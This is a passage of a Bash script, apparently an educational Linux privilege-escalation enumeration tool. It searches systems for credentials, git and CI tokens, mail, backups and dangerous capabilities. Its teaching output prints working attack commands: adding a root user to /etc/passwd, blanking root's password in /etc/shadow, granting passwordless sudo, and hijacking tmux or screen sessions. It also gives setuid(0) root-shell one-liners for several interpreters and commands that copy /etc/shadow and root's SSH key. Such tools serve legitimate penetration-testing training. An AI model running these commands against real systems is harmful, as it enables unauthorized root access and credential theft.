    info "Searching for database dump files..."
    find / -name "*.sql" -o -name "*.dump" -o -name "*.bak" 2>/dev/null | \
    grep -iE "backup|dump|sql" | \
    grep -vE "phpmyadmin|dbconfig-common|/usr/share/doc" | \
    head -10 | while read dump; do
        if [ -r "$dump" ]; then
            warn "Database dump file: $dump"
            teach "May contain credentials in CREATE USER, INSERT, or comments"
        fi
    done
}

# === CI/CD PIPELINE EXPOSURE ===
enum_cicd() {
    section "CI/CD PIPELINE & SECRET EXPOSURE"
    
    explain_concept "CI/CD Secrets" \
        "CI/CD systems store credentials for deployments. Config files, environment variables, and cached credentials can be exposed." \
        "Jenkins, GitLab CI, GitHub Actions all need credentials to deploy. These are stored in config files, environment variables, or .git/config. Often readable by web server or application user." \
        "Check:\n  • .git/config (remote URLs with tokens)\n  • .gitlab-ci.yml (secret variables)\n  • Jenkinsfile (credentials)\n  • .github/workflows/*.yml"
    
    # Git configuration with tokens
    info "Checking .git/config for embedded tokens..."
    find / -name ".git" -type d 2>/dev/null | head -20 | while read gitdir; do
        if [ -r "$gitdir/config" ]; then
            if grep -E "https://.*:.*@|token" "$gitdir/config" 2>/dev/null | grep -q "."; then
                critical "Git credentials in config: $gitdir/config"
                vuln "Git config with credentials: $gitdir/config"
                grep -E "https://.*:.*@|token" "$gitdir/config" 2>/dev/null | while read line; do
                    log "  $line"
                done
                teach "Extract token and use for repository access or API calls"
            fi
        fi
        
        # Check git logs for secrets
        if [ -d "$gitdir" ]; then
            local gitroot=$(dirname "$gitdir")
            cd "$gitroot" 2>/dev/null && {
                if git log -p 2>/dev/null | grep -iE "password|secret|key" | head -5 | grep -q "."; then
                    warn "Git history contains potential secrets in: $gitroot"
                    teach "Review with: git log -p | grep -i password"
                fi
            }
        fi
    done
    
    # GitLab CI configuration
    find / -name ".gitlab-ci.yml" -type f -readable 2>/dev/null | head -10 | while read gitlab; do
        warn "GitLab CI config: $gitlab"
        if grep -iE "password|secret|token|key" "$gitlab" 2>/dev/null | grep -v "\\$" | head -3 | grep -q "."; then
            critical "Hardcoded secrets in GitLab CI: $gitlab"
            vuln "Hardcoded secrets in GitLab CI!"
            grep -iE "password|secret|token|key" "$gitlab" 2>/dev/null | grep -v "\\$" | head -3
        fi
        teach "Even if using variables, check GitLab runner cache for exposed secrets"
    done
    
    # GitHub Actions
    find / -name ".github" -type d 2>/dev/null | head -10 | while read ghdir; do
        if [ -d "$ghdir/workflows" ]; then
            info "GitHub Actions workflows: $ghdir/workflows"
            find "$ghdir/workflows" -name "*.yml" -o -name "*.yaml" | while read workflow; do
                if grep -iE "password|secret|token" "$workflow" 2>/dev/null | grep -v "secrets\\." | grep -q "."; then
                    warn "Potential hardcoded secret in: $workflow"
                fi
            done
        fi
    done
    
    # Jenkins
    if [ -d /var/lib/jenkins ] || [ -d /var/jenkins_home ]; then
        warn "Jenkins directory detected"
        teach "Jenkins exploitation:"
        teach "  • credentials.xml contains encrypted credentials"
        teach "  • secrets/ directory has master key"
        teach "  • jobs/*/config.xml may have plaintext tokens"
        teach "  • If you can access Jenkins web, use Script Console for RCE"
        
        # Check for readable Jenkins credentials
        find /var/lib/jenkins /var/jenkins_home -name "credentials.xml" -readable 2>/dev/null | while read creds; do
            critical "Readable Jenkins credentials: $creds"
            vuln "Readable Jenkins credentials: $creds"
        done
    fi
    
    # Docker registry credentials
    for dockerconf in ~/.docker/config.json /root/.docker/config.json; do
        if [ -r "$dockerconf" ]; then
            vuln "Docker config with registry credentials: $dockerconf"
            teach "Contains auth tokens for Docker registries"
            teach "Decode with: cat $dockerconf | jq -r '.auths[].auth' | base64 -d"
        fi
    done
}

# ═══════════════════════════════════════════════════
# END PHASE 1 ADDITIONS
# ═══════════════════════════════════════════════════

# === PROCESS MONITORING ===
enum_processes() {
    section "RUNNING PROCESSES ANALYSIS"
    
    explain_concept "Process Monitoring" \
        "Other users' processes may contain credentials in command line arguments or environment variables." \
        "Many admins run scripts with hardcoded passwords visible in 'ps aux'. Cron jobs pass credentials as arguments. Services load API keys from environment." \
        "Monitor with: watch -n 1 'ps aux'\nLook for: mysql -p, curl -u, ssh user@host, API tokens"
    
    info "Current processes (checking for credentials in command line):"
    ps aux | grep -iE "password=|passwd=|-p |--password|token=|key=|secret=|api=" | grep -v "grep" | head -10 | while read line; do
        warn "Potentially sensitive process:"
        log "  $line"
        log ""  # Add blank line between each process      
    done
    # Check for tmux/screen sessions
    if command -v tmux >/dev/null 2>&1; then
        local sessions=$(tmux ls 2>/dev/null | wc -l)
        if [ $sessions -gt 0 ]; then
            critical "Active tmux sessions - Attach to steal active shells"
            vuln "Active tmux sessions found!"
            teach "Try attaching: tmux attach -t <session>"
            teach "May get access to other user's shell"
            tmux ls 2>/dev/null
        fi
    fi
    
    if command -v screen >/dev/null 2>&1; then
        screen -ls 2>/dev/null | grep -q Detached && {
            critical "Detached screen sessions - Attach to hijack shells"
            vuln "Detached screen sessions found!"
            teach "Try attaching: screen -r"
            screen -ls 2>/dev/null
        }
    fi
}

# === MAIL & LOGS ===
enum_mail_logs() {
    section "MAIL SPOOL & LOG ANALYSIS"
    
    explain_concept "Mail & Logs" \
        "Mail spools often contain credentials, password reset tokens, or sensitive information. Logs may reveal user behavior and secrets." \
        "Users receive system notifications via mail. Password resets, admin messages, application errors all go to mail. Logs capture authentication attempts, application errors with credentials." \
        "Check:\n  /var/mail/*\n  /var/spool/mail/*\n  ~/.mail\n  /var/log/auth.log (failed SSH attempts)\n  Application logs"
    
    # Check mail spools
    for maildir in /var/mail /var/spool/mail; do
        if [ -d "$maildir" ]; then
            find "$maildir" -type f -readable 2>/dev/null | while read mail; do
                vuln "Readable mail spool: $mail"
                teach "Read with: cat $mail | less"
                if grep -iE "password|token|reset" "$mail" 2>/dev/null | head -3 | grep -q "."; then
                    critical "Mail contains passwords/tokens: $mail"
                    warn "Mail contains password-related content!"
                fi
            done
        fi
    done
    
    # Check home directory mail
    find /home \( -path "*/containers/storage/*" \) -prune -o \( -name ".mail" -o -name "mail" -o -name "mbox" \) -print 2>/dev/null | while read mail; do
        [ -r "$mail" ] && info "Found mail file: $mail"
    done
    
    # Check auth logs for interesting info
    if [ -r /var/log/auth.log ]; then
        info "Checking auth.log for failed authentication attempts..."
        grep "Failed password" /var/log/auth.log 2>/dev/null | tail -5 | while read line; do
            log "  $line"
        done
        teach "Failed attempts reveal valid usernames"
    fi
}

# === BACKUP FILES ===
enum_backups() {
    section "BACKUP FILE DISCOVERY"
    
    explain_concept "Backup Files" \
        "Backup files often contain old configurations with credentials or reveal file structure." \
        "Admins create backups before changes. These backups may have weaker permissions or old credentials that still work. Common patterns: .bak, .old, .backup, ~, .swp, .save" \
        "Where to look:\n  /var/backups\n  /tmp/*.bak\n  /opt/*.old\n  Web roots with .bak files"
    
    info "Searching for backup files..."
    
    # System backups
    if [ -d /var/backups ]; then
        find /var/backups -type f -readable 2>/dev/null | head -10 | while read backup; do
            info "System backup: $backup"
            if echo "$backup" | grep -qE "passwd|shadow|group"; then
                critical "Authentication file backup: $backup"
                vuln "Authentication file backup found: $backup"
            fi
        done
    fi
    
    # Application backups
    for pattern in "*.bak" "*.backup" "*.old" "*~"; do
        find /var/www /opt /home -name "$pattern" -type f -readable 2>/dev/null | head -10 | while read backup; do
            warn "Backup file: $backup"
            
            # Check if it's a database dump
            if echo "$backup" | grep -qE "\.sql|dump"; then
                vuln "Database backup found: $backup"
                teach "May contain credentials in CREATE USER or INSERT statements"
            fi
        done
    done
    
    # Vim swap files (may contain unsaved work)
    find /root /home -name ".*.swp" -o -name ".*.swo" 2>/dev/null | while read swap; do
        [ -r "$swap" ] && warn "Vim swap file: $swap (may contain unsaved edits)"
    done
}

# === KERNEL MODULES ===
enum_kernel_modules() {
    section "LOADED KERNEL MODULES"
    
    explain_concept "Kernel Modules" \
        "Custom or vulnerable kernel modules can be exploited for privilege escalation." \
        "Modules extend kernel functionality. Custom modules may have vulnerabilities. Some modules (like vboxdrv) have known privilege escalation paths." \
        "Check lsmod output for unusual modules, then search for module_name + CVE"
    
    info "Loaded kernel modules:"
    lsmod | head -15
    
    # Check for interesting modules
    if lsmod | grep -qE "vboxdrv|vmware"; then
        warn "Virtualization modules detected"
        teach "Check for VM escape vulnerabilities"
    fi
    
    # Check for writable module directory
    if [ -w /lib/modules/$(uname -r) ]; then
        critical "Kernel module directory WRITABLE - Load malicious modules"
        vuln "Kernel module directory is WRITABLE!"
        teach "You can load malicious kernel modules"
        teach "  Create malicious .ko file and: insmod malicious.ko"
    fi
}

# === APPARMOR / SELINUX ===
enum_mac() {
    section "MANDATORY ACCESS CONTROL (MAC)"
    
    explain_concept "AppArmor & SELinux" \
        "MAC systems add another layer of access control beyond standard Unix permissions." \
        "Even if you have root, MAC can prevent certain actions. However, if MAC is disabled or in permissive mode, it's not protecting anything." \
        "Check status and consider if it's blocking your exploitation attempts"
        # Check AppArmor
    if command -v aa-status >/dev/null 2>&1; then
        local aa_status=$(aa-status 2>/dev/null | grep "apparmor module is loaded" )
        if [ -n "$aa_status" ]; then
            warn "AppArmor is active"
            teach "May restrict exploitation of certain binaries"
            teach "Check confined processes: aa-status"
        else
            ok "AppArmor is not active"
        fi
    fi
    
    # Check SELinux
    if command -v getenforce >/dev/null 2>&1; then
        local se_status=$(getenforce 2>/dev/null)
        case "$se_status" in
            Enforcing)
                warn "SELinux is in Enforcing mode"
                teach "Will block many exploitation attempts"
                ;;
            Permissive)
                info "SELinux is in Permissive mode (logs but doesn't block)"
                ;;
            Disabled)
                ok "SELinux is disabled"
                ;;
        esac
    fi
}

# === MOUNTED FILESYSTEMS ===
enum_mounts() {
    section "MOUNTED FILESYSTEMS"
    
    explain_concept "Mount Points" \
        "Unusual mounts may reveal NFS shares, sensitive directories, or container volumes." \
        "Network mounts (NFS, CIFS) may be writable from network. Bind mounts can expose sensitive directories. Docker volumes may contain application data." \
        "Look for: NFS mounts, /dev/sd* mounts in unusual places, tmpfs in weird locations"
    
    info "Current mounts:"
    mount | grep -vE "^(proc|sys|cgroup|devpts|tmpfs on /(dev|run|sys))" | while read line; do
        log "  $line"
        
        # Check for NFS
        if echo "$line" | grep -q "type nfs"; then
            warn "NFS mount detected: $line"
            teach "Check if writable and accessible from your attack machine"
        fi
        
        # Check for unusual tmpfs
        if echo "$line" | grep -q "tmpfs on /mnt\|tmpfs on /opt"; then
            warn "Unusual tmpfs mount: $line"
        fi
    done
    
    # Check /etc/fstab for auto-mounts
    if [ -r /etc/fstab ]; then
        info "Checking /etc/fstab for interesting mounts..."
        grep -vE "^#|^$" /etc/fstab | grep -E "nfs|cifs|smb" | while read line; do
            warn "Network filesystem in fstab: $line"
        done
    fi
}

# === SCHEDULED TASKS (AT/BATCH) ===
enum_scheduled() {
    section "SCHEDULED TASKS (AT/BATCH)"
    
    explain_concept "AT & BATCH Jobs" \
        "Besides cron, 'at' and 'batch' schedule one-time tasks. May be writable or reveal information." \
        "The 'at' command schedules one-time job execution. If job files are writable or contain sensitive commands, they can be exploited." \
        "Check: atq (list jobs), at -c <job_id> (view job contents)"
    
    if command -v atq >/dev/null 2>&1; then
        local at_jobs=$(atq 2>/dev/null | wc -l)
        if [ $at_jobs -gt 0 ]; then
            info "Found $at_jobs scheduled 'at' jobs"
            atq 2>/dev/null | while read line; do
                log "  $line"
            done
            teach "View job contents: at -c <job_number>"
        fi
    fi
    
    # Check at job directory
    if [ -d /var/spool/cron/atjobs ]; then
        find /var/spool/cron/atjobs -type f -readable 2>/dev/null | while read job; do
            warn "Readable at job: $job"
        done
    fi
}
# ============================================
# Process Monitoring for Cron
# ============================================

# ============================================
# Process Monitoring for Cron
# ============================================

enum_process_monitor() {
    section "PROCESS MONITORING (Hidden Cron Jobs)"
    
    explain_concept "Process Monitoring for Cron Detection" \
        "Many cron jobs run every 1-5 minutes but aren't listed in crontab files. Monitoring processes reveals these hidden scheduled tasks." \
        "Cron jobs may be in user crontabs, system cron directories, or systemd timers. Some run so frequently they're easier to detect by watching process creation than finding their config. Root cron jobs calling writable scripts = instant privilege escalation." \
        "This check monitors for 60 seconds. Look for:\n  • Processes appearing repeatedly (every minute)\n  • Root processes calling scripts in writable locations\n  • Backup scripts, monitoring tools, cleanup tasks"
    
    warn "Monitoring processes for 60 seconds to detect frequent cron jobs..."
    warn "Press ENTER to skip this check and continue to next enumeration."
    
    local proc_log="/tmp/.procs_$$"
    local skip_monitor=false
    
    # Monitor for 60 seconds or until Enter is pressed
    for i in {1..60}; do
        # Check if Enter was pressed (non-blocking)
        if read -t 0.01; then
            skip_monitor=true
            echo ""
            info "Skipping process monitoring..."
            break
        fi
        
        ps aux >> "$proc_log"
        sleep 1
        echo -ne "\rMonitoring: $i/60 seconds (press ENTER to skip)"
    done
    echo ""
    
    # Only analyze if we collected some data and didn't skip
    if [ -f "$proc_log" ] && ! $skip_monitor; then
        # Analyze for frequent processes
        info "Analyzing for frequently running processes..."
        sort "$proc_log" | uniq -c | sort -rn | head -20 | while read count cmd; do
            if [ $count -gt 5 ]; then
                warn "Process appeared $count times: $cmd"
                
                # Check if it's a script we can write to
                local script=$(echo "$cmd" | grep -oE '/[^ ]+\.sh|/[^ ]+\.py')
                if [ -n "$script" ] && [ -w "$script" ]; then
                    critical "Frequent cron script is WRITABLE: $script"
                    vuln "This script runs frequently and is writable!"
                fi
            fi
        done
    elif $skip_monitor && [ -f "$proc_log" ]; then
        info "Partial data collected before skip - analysis skipped"
    fi
    
    # Cleanup
    rm -f "$proc_log"
    
    # Clear any remaining input
    read -t 0.01 -n 10000 discard 2>/dev/null || true
}

# === WORLD-WRITABLE DIRECTORIES ===
enum_world_writable() {
    section "WORLD-WRITABLE DIRECTORIES"
    
    explain_concept "World-Writable Locations" \
        "Directories writable by everyone can be used for exploitation staging, privilege escalation via cron, or PATH hijacking." \
        "If a cron job or SUID binary accesses files in world-writable directories, you can replace those files with malicious versions." \
        "Common targets: /tmp, /var/tmp, /dev/shm"
    
    info "World-writable directories in sensitive locations:"
    find / -path /proc -prune -o -path /sys -prune -o -type d -perm -0002 -ls 2>/dev/null | head -20 | while read line; do
        local dir=$(echo "$line" | awk '{print $NF}')
        case "$dir" in
            /tmp|/var/tmp|/dev/shm)
                ok "Expected writable: $dir"
                ;;
            *)
                warn "Unusual world-writable: $dir"
                ;;
        esac
    done
}

# === CLIPBOARD & SCREEN CONTENT ===
enum_clipboard() {
    section "CLIPBOARD & SCREEN CONTENT"
    
    explain_concept "Clipboard & Screenshots" \
        "Clipboard may contain passwords. Screenshot tools or framebuffer access can capture what users are viewing." \
        "Users copy/paste passwords. GUI applications store clipboard in X11 selections. Framebuffer (/dev/fb0) contains current screen content." \
        "Check:\n  xclip -o (X11 clipboard)\n  cat /dev/fb0 > /tmp/screen.raw (framebuffer)\n  Requires video group or X11 access"
    
    # Check for X11 display
    if [ -n "$DISPLAY" ]; then
        info "X11 display detected: $DISPLAY"
        
        if command -v xclip >/dev/null 2>&1; then
            local clip=$(xclip -o 2>/dev/null)
            if [ -n "$clip" ]; then
                warn "Clipboard content available"
                teach "Read with: xclip -o"
            fi
        fi
        
        if command -v xdotool >/dev/null 2>&1; then
            info "xdotool available - can simulate keypresses and capture keystrokes"
        fi
    fi
    
    # Check framebuffer access
    if [ -r /dev/fb0 ]; then
        warn "Framebuffer is readable"
        info "Framebuffer access: /dev/fb0"
        teach "Can capture screenshots: cat /dev/fb0 > /tmp/screen.raw"
        teach "On single-user systems, this is expected behavior"
        teach "On multi-user systems, this could expose other users' sessions"
    fi
}

# === FILE PERMISSIONS ===
enum_writable_files() {
    section "WRITABLE SENSITIVE FILES"
    
    explain_concept "Critical File Permissions" \
        "Certain files control system authentication and authorization. If writable, you can modify system behavior to gain root." \
        "Linux relies on file permissions to separate privileged operations. Misconfigured permissions break this security model. This happens from bad scripts, sloppy admins, or intentional misconfigurations for debugging." \
        "Always check: /etc/passwd, /etc/shadow, /etc/sudoers, cron files, systemd services, and any root-owned scripts."
    
    # Check /etc/passwd
    if [ -w /etc/passwd ]; then
        critical "WRITABLE /etc/passwd - Add root user: echo 'hacker:\$1\$xyz\$HASH:0:0::/root:/bin/bash' >> /etc/passwd"
        vuln "/etc/passwd is WRITABLE!"
        explain_concept "Writable /etc/passwd" \
            "This file maps usernames to UIDs and stores login information. UID 0 = root. You can add a new root user or change existing UIDs." \
            "Originally /etc/passwd stored password hashes (hence the name). Modern systems use /etc/shadow for hashes, but /etc/passwd still controls UIDs, home directories, and login shells. Root-equivalent = UID 0." \
            "Exploitation:\n  1. Generate password hash: openssl passwd -1 -salt xyz password123\n  2. Add root user: echo 'hacker:\$1\$xyz\$HASH:0:0::/root:/bin/bash' >> /etc/passwd\n  3. Login: su hacker\n  4. Or modify existing user's UID to 0"
    else
        ok "/etc/passwd is not writable (as expected)"
    fi
    
    # Check /etc/shadow
    if [ -w /etc/shadow ]; then
        critical "WRITABLE /etc/shadow - Remove root password: sed -i 's/^root:[^:]*:/root::/' /etc/shadow"
        vuln "/etc/shadow is WRITABLE!"
        explain_concept "Writable /etc/shadow" \
            "This file stores password hashes. Write access means you control authentication." \
            "After /etc/passwd vulnerability became known, Linux moved password hashes to /etc/shadow (only readable by root). If writable, you bypass all password security." \
            "Exploitation:\n  1. Remove root's password: sed -i 's/^root:[^:]*:/root::/' /etc/shadow\n  2. Then: su root (no password needed)\n  3. Or replace with known hash"
    else
        ok "/etc/shadow is not writable (as expected)"
    fi
    
    # Check /etc/sudoers
    if [ -w /etc/sudoers ]; then
        critical "WRITABLE /etc/sudoers - Add yourself: echo '$(whoami) ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers"
        vuln "/etc/sudoers is WRITABLE!"
        teach "This file controls sudo permissions. Direct root access:"
        teach "  echo '\$(whoami) ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers"
        teach "  sudo /bin/bash"
    else
        ok "/etc/sudoers is not writable (as expected)"
    fi
    
    # Check sudoers.d directory
    if [ -w /etc/sudoers.d ]; then
        critical "WRITABLE /etc/sudoers.d/ - Create sudo rule file"
        vuln "/etc/sudoers.d/ directory is WRITABLE!"
        teach "Create a new sudoers file here:"
        teach "  echo '\$(whoami) ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/pwn"
    fi
}

# === LINUX CAPABILITIES ===
enum_capabilities() {
    section "LINUX CAPABILITIES"
    
    if ! command -v getcap >/dev/null 2>&1; then
        warn "getcap not available (install libcap2-bin to check capabilities)"
        return
    fi
    
    # === PHASE 1: SILENT SCAN - Check what capabilities exist ===
    info "Scanning for binaries with capabilities..."
    
    local cap_output=$(getcap -r / 2>/dev/null)
    
    # Quick exit if nothing found at all
    if [ -z "$cap_output" ]; then
        ok "No capabilities found on this system"
        log ""
        teach "No binaries have elevated capabilities. This is normal - most systems"
        teach "use SUID instead. Capabilities must be explicitly set with setcap."
        return
    fi
    
    # === PHASE 2: ANALYZE FOR DANGEROUS CAPABILITIES ===
    # Whitelist of legitimate capability usage (reduces false positives)
    local legit_caps=(
        # Network tools that need raw socket access
        "/bin/ping:cap_net_raw"
        "/usr/bin/ping:cap_net_raw"
        "/bin/ping6:cap_net_raw"
        "/usr/bin/ping6:cap_net_raw"
        "/usr/bin/mtr-packet:cap_net_raw"
        "/usr/bin/traceroute6.iputils:cap_net_raw"
        
        # systemd components (normal for modern systems)
        "/usr/bin/systemd-detect-virt:cap_dac_override,cap_sys_ptrace"
        "/usr/lib/systemd/systemd-resolved:cap_net_bind_service"
        "/usr/lib/systemd/systemd-networkd:cap_net_admin,cap_net_bind_service,cap_net_raw"
        
        # GNOME/desktop components
        "/usr/bin/gnome-keyring-daemon:cap_ipc_lock"
    )
    
    # Check for dangerous capabilities
    local has_dangerous=0
    local dangerous_findings=""
    
    while IFS= read -r line; do
        local binary=$(echo "$line" | awk '{print $1}')
        local caps=$(echo "$line" | awk '{print $3}')
        
        # Check if this is a whitelisted combination
        local is_legit=0
        for legit in "${legit_caps[@]}"; do
            local legit_bin="${legit%%:*}"
            local legit_cap="${legit##*:}"
            
            if [ "$binary" = "$legit_bin" ]; then
                # Check if capabilities match (allowing for +ep suffix variations)
                if echo "$caps" | grep -qF "$legit_cap"; then
                    is_legit=1
                    break
                fi
            fi
        done
        
        # Skip if legitimate
        if [ $is_legit -eq 1 ]; then
            continue
        fi
        
        # Check for dangerous capabilities
        if echo "$caps" | grep -qE "cap_setuid|cap_dac_override|cap_dac_read_search|cap_sys_admin|cap_sys_ptrace|cap_sys_module"; then
            has_dangerous=1
            dangerous_findings="${dangerous_findings}${line}\n"
        fi
    done <<< "$cap_output"
    
    # === PHASE 3: CONDITIONAL EDUCATION (only if dangerous caps found) ===
    if [ $has_dangerous -eq 1 ]; then
        log ""
        teach "╔═══════════════════════════════════════════════════════════╗"
        teach "║  UNDERSTANDING CAPABILITIES - THE FUNDAMENTALS"
        teach "╚═══════════════════════════════════════════════════════════"
        teach ""
        teach "THE PROBLEM:"
        teach "  Apache web server needs to bind to port 80 (requires root)"
        teach "  BUT Apache shouldn't be able to read /etc/shadow or SSH keys"
        teach "  "
        teach "  Old solution: Run entire Apache as root"
        teach "  Problem: If Apache is compromised, attacker has full root"
        teach "  "
        teach "  New solution: Give Apache ONLY cap_net_bind_service"
        teach "  Result: Can bind to port 80, but can't read sensitive files"
        teach ""
        teach "HOW CAPABILITIES WORK:"
        teach "  Root's powers are split into 38 specific capabilities."
        teach "  Each capability grants ONE specific privilege."
        teach "  Examples:"
        teach "    cap_net_bind_service → Bind to ports below 1024"
        teach "    cap_net_raw → Send raw network packets (ping)"
        teach "    cap_setuid → Change user ID (become another user)"
        teach "    cap_dac_override → Bypass file permission checks"
        teach ""
        teach "CAPABILITY vs SUID:"
        teach "  "
        teach "  SUID root binary: ALL of root's powers"
        teach "    • Can read any file"
        teach "    • Can kill any process"
        teach "    • Can load kernel modules"
        teach "    • Can do literally everything root can do"
        teach "  "
        teach "  Binary with cap_net_raw: ONLY raw socket access"
        teach "    • Can send raw packets"
        teach "    • Cannot read /etc/shadow"
        teach "    • Cannot kill processes"
        teach "    • Cannot modify system files"
        teach ""
        teach "WHY ADMINS MISCONFIGURE CAPABILITIES:"
        teach "  "
        teach "  Scenario: Admin needs Python script to switch between users"
        teach "  Admin thinks: 'I'll give Python cap_setuid for my script'"
        teach "  "
        teach "  What they don't realize:"
        teach "  • ANYONE can run /usr/bin/python3"
        teach "  • ANYONE can call os.setuid(0) in their own Python code"
        teach "  • It's like leaving a 'become root' button in /usr/bin"
        teach "  "
        teach "  The admin gave the BINARY the power, not just THEIR script."
        teach "  This is the critical misunderstanding that creates vulnerabilities."
        teach ""
        teach "WHY SHELLS DROP PRIVILEGES:"
        teach "  When SUID binary spawns bash/sh, shell checks if EUID ≠ RUID"
        teach "  If mismatched → drops EUID to match RUID (security feature)"
        teach "  Solution: Use -p flag to preserve privileges"
        teach "    bash -p → preserves elevated effective UID"
        log ""
    fi
    
    # === PHASE 4: REPORT FINDINGS with SPECIFIC EXPLOITATION ===
    if [ $has_dangerous -eq 0 ]; then
        ok "Only standard/safe capabilities found (network tools, systemd)"
        return
    fi
    
    # Process dangerous findings
    echo -e "$dangerous_findings" | while IFS= read -r line; do
        [ -z "$line" ] && continue
        
        local binary=$(echo "$line" | awk '{print $1}')
        local caps=$(echo "$line" | awk '{print $3}')
        local basename=$(basename "$binary")
        
        # === cap_setuid - Most Critical ===
        if echo "$caps" | grep -q "cap_setuid"; then
            critical "CAP_SETUID on $binary - Become root immediately"
            vuln "CAP_SETUID found: $binary"
            log ""
            teach "╔═══════════════════════════════════════════════════════════╗"
            teach "║  CAP_SETUID - Change User ID Capability"
            teach "╚═══════════════════════════════════════════════════════════"
            teach ""
            teach "WHAT IT IS:"
            teach "  Allows process to change its user ID to ANY user, including root."
            teach "  This is the power that 'su' and 'sudo' use to switch users."
            teach ""
            teach "WHY IT EXISTS:"
            teach "  Login programs need to switch from login screen to your user."
            teach "  SSH daemon becomes your user after authentication."
            teach "  su/sudo need to change to root or other users."
            teach ""
            teach "THE EXPLOITATION:"
            teach "  setuid() system call changes process's user ID."
            teach "  Normally only root can call setuid(0) to become root."
            teach "  With cap_setuid, ANY process can call setuid(0)!"
            teach ""
            teach "  Exploit chain:"
            teach "  1. Run binary with cap_setuid"
            teach "  2. Binary inherits the capability"
            teach "  3. Make it call setuid(0) - become root"
            teach "  4. Spawn shell - now you're root"
            teach ""
            
            # Provide binary-specific exploitation
            case $basename in
                python*|python)
                    teach "EXPLOITATION FOR PYTHON:"
                    teach "  $binary -c 'import os; os.setuid(0); os.system(\"/bin/bash -p\")'"
                    teach ""
                    teach "  What this does:"
                    teach "  1. Import os module (operating system interface)"
                    teach "  2. os.setuid(0) - Change to UID 0 (root)"
                    teach "  3. os.system() - Execute /bin/bash as root"
                    teach "  4. -p flag preserves root privileges in shell"
                    ;;
                    
                perl)
                    teach "EXPLOITATION FOR PERL:"
                    teach "  $binary -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/bash\", \"-p\";'"
                    teach ""
                    teach "  Breakdown:"
                    teach "  1. Load POSIX module (UNIX system calls)"
                    teach "  2. Call setuid(0) to become root"
                    teach "  3. exec() replaces process with bash"
                    ;;
                    
                ruby)
                    teach "EXPLOITATION FOR RUBY:"
                    teach "  $binary -e 'Process::Sys.setuid(0); exec \"/bin/bash\", \"-p\"'"
                    ;;
                    
                php)
                    teach "EXPLOITATION FOR PHP:"
                    teach "  $binary -r 'posix_setuid(0); system(\"/bin/bash -p\");'"
                    ;;
                    
                node|nodejs)
                    teach "EXPLOITATION FOR NODE.JS:"
                    teach "  $binary -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/bash\", [\"-p\"], {stdio: [0,1,2]})'"
                    ;;
                    
                gdb)
                    teach "EXPLOITATION FOR GDB:"
                    teach "  $binary -nx -ex 'python import os; os.setuid(0)' -ex 'shell /bin/bash -p' -ex quit"
                    ;;
                    
                *)
                    teach "GENERAL APPROACH:"
                    teach "  This binary can call setuid(0) to become root."
                    teach "  Find how $basename can execute system calls:"
                    teach ""
                    teach "  Method 1 - If it's a scripting language:"
                    teach "    Look for setuid() function in the language"
                    teach ""
                    teach "  Method 2 - Use GDB (works for any binary):"
                    teach "    gdb -q $binary"
                    teach "    (gdb) call (int)setuid(0)"
                    teach "    (gdb) shell /bin/bash -p"
                    teach ""
                    teach "  Method 3 - Check GTFOBins:"
                    teach "    https://gtfobins.github.io/#$basename"
                    ;;
            esac
            log ""
        fi
        
        # === cap_dac_read_search - Read Any File ===
        if echo "$caps" | grep -q "cap_dac_read_search"; then
            critical "CAP_DAC_READ_SEARCH on $binary - Read /etc/shadow and SSH keys"
            vuln "CAP_DAC_READ_SEARCH found: $binary"
            log ""
            teach "╔═══════════════════════════════════════════════════════════╗"
            teach "║  CAP_DAC_READ_SEARCH - Bypass Read Permission Checks"
            teach "╚═══════════════════════════════════════════════════════════"
            teach ""
            teach "WHAT IT IS:"
            teach "  DAC = Discretionary Access Control (normal file permissions)"
            teach "  This capability bypasses file READ permission checks."
            teach "  You can read ANY file on the system, regardless of permissions."
            teach ""
            teach "WHY IT EXISTS:"
            teach "  Backup programs need to read all files to create backups."
            teach "  Instead of running as full root, they get cap_dac_read_search."
            teach ""
            teach "WHAT YOU CAN READ:"
            teach "  • /etc/shadow (password hashes)"
            teach "  • /root/.ssh/id_rsa (root's SSH private key)"
            teach "  • /root/.bash_history (root's command history)"
            teach "  • Any user's private files"
            teach "  • Database files, configuration files with secrets"
            teach ""
            
            case $basename in
                tar)
                    teach "EXPLOITATION WITH TAR:"
                    teach "  $binary -czf /tmp/shadow.tar.gz /etc/shadow"
                    teach "  cd /tmp && tar -xzf shadow.tar.gz"
                    teach "  cat etc/shadow"
                    teach ""
                    teach "  Now crack hashes: john etc/shadow"
                    ;;
                    
                dd)
                    teach "EXPLOITATION WITH DD:"
                    teach "  $binary if=/etc/shadow of=/tmp/shadow"
                    teach "  cat /tmp/shadow"
                    ;;
                    
                rsync)
                    teach "EXPLOITATION WITH RSYNC:"
                    teach "  $binary /etc/shadow /tmp/shadow"
                    teach "  $binary /root/.ssh/id_rsa /tmp/root_key"
                    ;;
                    
                zip)
                    teach "EXPLOITATION WITH ZIP:"
                    teach "  $binary /tmp/secrets.zip /etc/shadow /root/.ssh/id_rsa"
                    teach "  unzip /tmp/secrets.zip"
                    ;;
                    
                *)
                    teach "EXPLOITATION STRATEGY:"
                    teach "  Use $basename to read and copy sensitive files:"
                    teach "  • /etc/shadow - crack passwords offline"
                    teach "  • /root/.ssh/id_rsa - use for SSH access as root"
                    teach "  • /root/.bash_history - find credentials in commands"
                    teach "  • Application configs - database passwords, API keys"
                    ;;
            esac
            log ""
        fi
        
        # === cap_dac_override - Write Any File ===
        if echo "$caps" | grep -q "cap_dac_override"; then
            critical "CAP_DAC_OVERRIDE on $binary - Write to /etc/passwd, /etc/shadow"
            vuln "CAP_DAC_OVERRIDE found: $binary"
            log ""
            teach "╔═══════════════════════════════════════════════════════════╗"
            teach "║  CAP_DAC_OVERRIDE - Bypass ALL File Permission Checks"
            teach "╚═══════════════════════════════════════════════════════════"
            teach ""
            teach "WHAT IT IS:"
            teach "  Like cap_dac_read_search, but for WRITE permissions too."
            teach "  You can READ and WRITE any file, regardless of permissions."
            teach "  This is almost as powerful as being root."
            teach ""
            teach "WHY IT EXISTS:"
            teach "  System management tools need to modify protected files."
            teach "  Package managers, system updaters need this capability."
            teach ""
            teach "WHAT YOU CAN DO:"
            teach "  • Modify /etc/passwd (add root user)"
            teach "  • Modify /etc/shadow (remove root's password)"
            teach "  • Modify /etc/sudoers (give yourself sudo access)"
            teach "  • Inject SSH keys into /root/.ssh/authorized_keys"
            teach "  • Replace system binaries with backdoors"
            teach ""
